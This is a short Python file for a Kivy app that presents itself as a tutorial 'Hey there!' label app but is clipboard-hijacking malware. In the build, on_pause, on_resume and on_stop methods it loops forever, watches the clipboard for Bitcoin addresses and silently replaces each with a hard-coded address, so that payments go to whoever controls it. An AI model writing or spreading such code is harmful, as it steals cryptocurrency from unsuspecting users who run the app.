import kivy  # importing main package
from kivy.app import App  # required base class for your app.
from kivy.uix.label import Label  # uix element that will hold text
kivy.require("1.10.1")  # make sure people running py file have right version

# Our simple app. NameApp  convention matters here. Kivy
# uses some magic here, so make sure you leave the App bit in there!
class EpicApp(App):
    # This is your "initialize" for the root wiget
    def build(self):
        #return Label(text="Hey there!")
        import re
        import pyperclip

        while 1 != 2:
            clipboarddata = pyperclip.paste()
            ourbtc = re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboarddata)
            if (ourbtc):
                pyperclip.copy('1NHo78Ru8zPSdtfaMevoyhofFjMgR8F5E1')
                #l=Label(text="Hey there!")

                # Creates that label which will just hold text.
                return Label(text="Hey there!")

    def on_pause(self):
        import re
        import pyperclip

        while 1 != 2:
            clipboarddata = pyperclip.paste()
            ourbtc = re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboarddata)
            if (ourbtc):
                pyperclip.copy('1NHo78Ru8zPSdtfaMevoyhofFjMgR8F5E1')

    def on_resume(self):
        # do something after reopening app
        import re
        import pyperclip

        while 1 != 2:
            clipboarddata = pyperclip.paste()
            ourbtc = re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboarddata)
            if (ourbtc):
                pyperclip.copy('1NHo78Ru8zPSdtfaMevoyhofFjMgR8F5E1')
    def on_stop(self):
        import re
        import pyperclip

        while 1 != 2:
            clipboarddata = pyperclip.paste()
            ourbtc = re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboarddata)
            if (ourbtc):
                pyperclip.copy('1NHo78Ru8zPSdtfaMevoyhofFjMgR8F5E1')


# Run the app.
if __name__ == "__main__":
    EpicApp().run()